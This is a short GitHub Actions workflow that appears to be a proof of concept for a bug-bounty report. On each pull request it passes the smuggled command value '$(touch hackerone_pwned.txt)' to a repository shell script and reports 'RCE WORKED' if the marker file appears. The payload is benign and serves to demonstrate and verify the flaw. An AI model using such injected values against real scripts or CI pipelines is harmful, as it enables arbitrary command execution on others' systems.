on:
  pull_request:
    types: [opened, synchronize]

jobs:
  exploit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Run vulnerable script
        run: |
          ./scripts/get-package-json-key.sh '$(touch hackerone_pwned.txt)' MY_VAR_OUTPUT

      - name: Verify exploit
        run: |
          if [ -f "hackerone_pwned.txt" ]; then
            echo "[+] SUCCESS: RCE WORKED!"
            cat hackerone_pwned.txt
          else
            echo "[-] FAILED"
            exit 1
          fi
